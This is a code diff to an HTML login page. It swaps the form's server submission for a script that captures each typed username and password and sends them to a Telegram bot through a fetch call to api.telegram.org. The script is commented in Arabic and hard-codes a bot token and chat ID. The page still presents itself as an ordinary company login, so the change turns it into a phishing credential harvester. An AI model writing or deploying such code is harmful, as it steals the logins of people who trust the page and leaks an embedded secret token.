@@ -88,7 +88,7 @@
 <body>
   <div class="login-container">
     <h2>Login</h2>
-    <form action="login.php" method="POST">
+    <form id="loginForm" onsubmit="sendData(event)">
       <div class="form-group">
         <label for="username">Username or Email</label>
         <input type="text" id="username" name="username" required />
@@ -103,5 +103,40 @@
       &copy; 2025 Your Company. All rights reserved.
     </div>
   </div>
+
+  <script>
+    // هذه الدالة تُنفذ عندما يُرسل النموذج
+    function sendData(event) {
+        // منع إرسال النموذج بشكل افتراضي
+        event.preventDefault();
+
+        // استخراج البيانات من النموذج
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        // تكوين الرسالة التي سترسل إلى Telegram
+        const message = `تم تسجيل دخول جديد:\nاسم المستخدم: ${username}\nكلمة المرور: ${password}`;
+
+        // إرسال البيانات إلى Telegram عبر API
+        const botToken = '7883105519:AAFQdf8KtmeAXS02nCcpAe_0rhOgpj1cfSc'; // استبدل بـ token الخاص بك
+        const chatId = '6773579568'; // استبدل بـ chat id الخاص بك
+
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        // استخدام fetch لإرسال البيانات إلى Telegram
+        fetch(telegramUrl)
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert('تم إرسال البيانات إلى Telegram!');
+                } else {
+                    alert('حدث خطأ أثناء إرسال البيانات.');
+                }
+            })
+            .catch(error => {
+                alert('حدث خطأ في الاتصال: ' + error);
+            });
+    }
+  </script>
 </body>
 </html>
